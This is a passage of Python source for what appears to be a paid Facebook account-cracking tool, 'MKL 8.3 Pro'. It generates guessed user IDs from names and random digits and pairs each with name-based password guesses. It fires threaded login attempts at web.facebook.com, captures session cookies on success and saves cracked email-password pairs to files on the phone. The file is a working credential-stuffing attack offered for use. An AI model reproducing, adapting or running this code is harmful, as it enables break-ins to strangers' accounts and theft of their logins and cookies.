    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,5))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xxxx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack2,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def mkl5():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+'.'+last+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+'.'+last[0:1]+'.'+digitx,first+'.'+last+'.'+digitx,first[1:]+'.'+last[1:]+'.'+digitx])
            pwx = ['u'+first+last,'mg'+first+last,'ko'+first+last,'daw'+first+last,'ma'+first+last,'oo'+first+last,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',first+last+'12345',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack2,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     

def rcrack2(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    try:
        for ps in pwx:
            pro = random.choice(ugen3)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[MKL-OK] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;36m'+coki+'\033[0;97m')
                print('\033[1;34m  >>>-----------------------------------------------➤')
                cek_apk(session,coki)
                open('/sdcard/MKL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                print('\r\r\33[1;31m[MKL-CP] ' +uid+ ' | ' +ps+'')
                open('/sdcard/MKL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s[MKL-M3]-[%s]-[%s]-[OK]-[%s]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass       
        



logo = ("""\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××
\033[1;33m|\033[1;33m      ____    ____     ___  ____      _____         \033[1;33m |
\033[1;33m|\033[1;33m     |_   \  /   _|   |_  ||_  _|    |_   _|        \033[1;33m |
\033[1;33m|\033[1;32m       |   \/   |       | |_/ /        | |          \033[1;33m |
\033[1;33m|\033[1;32m       | |\  /| |       |  __'.        | |   _      \033[1;33m |
\033[1;33m|\033[1;91m      _| |_\/_| |_  _  _| |  \ \_  _  _| |__/ |     \033[1;33m |
\033[1;33m|\033[1;91m     |_____||_____|(_)|____||____|(_)|________|     \033[1;33m |
\033[1;33m|                                                   \033[1;33m  |
\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××
\033[1;93m|\033[1;32m>> FACEBOOK     : https://www.facebook.com/ngeko9984\033[1;93m |
\033[1;93m|\033[1;35m>> Developer    : Zaw Myo Aung                      \033[1;93m |
\033[1;93m|\033[1;36m>> Tool Ststus  : Myanmar Number & MAIL & USER NAME \033[1;93m |
\033[1;93m|\033[1;33m>> Tool Buy     : 09797805940                       \033[1;93m |
\033[1;93m|\033[1;91m>> Tool Virsion : 8.3 Pro                           \033[1;93m |
\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××""")
print(logo)
CorrectUsername = 'mkl'
key = 'true'
while key == 'true':
    username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
            print(f'\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××\n\033[0;97m[•]\033[1;32m LOGGED IN MKL-8•3-Pro TOOL SUCCESSFULLY') 
            time.sleep(1)
            os.system('clear')
            key = 'false'
            
if __name__ == "__main__":
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r[\x1b[1;92m•\x1b[1;97m] \x1b[38;5;42mLoading...\033[97;1m " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    main()    
      